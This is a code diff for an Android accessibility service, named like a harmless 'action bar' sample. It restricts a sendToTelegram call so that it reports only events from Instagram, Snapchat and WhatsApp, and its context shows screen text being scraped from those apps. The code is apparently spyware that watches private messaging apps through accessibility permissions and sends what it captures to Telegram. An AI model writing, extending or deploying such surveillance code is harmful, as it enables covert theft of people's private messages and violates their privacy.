@@ -53,8 +53,11 @@ public class GlobalActionBarService extends AccessibilityService {
 
         // --- DEBUG: Send package name for EVERY event ---
         // After confirming events arrive, you can comment out this line.
-        sendToTelegram("🔍 DEBUG: Event from " + pkg + " | Type: " + event.getEventType());
-
+        if (pkg.equals("com.instagram.android") ||
+    pkg.equals("com.snapchat.android") ||
+    pkg.equals("com.whatsapp")) {
+    sendToTelegram("🔍 DEBUG: Event from " + pkg + " | Type: " + event.getEventType());
+}
         // --- Now try to scrape text from the screen (only for Instagram, Snapchat, WhatsApp) ---
         if (pkg.equals("com.instagram.android") ||
             pkg.equals("com.snapchat.android") ||
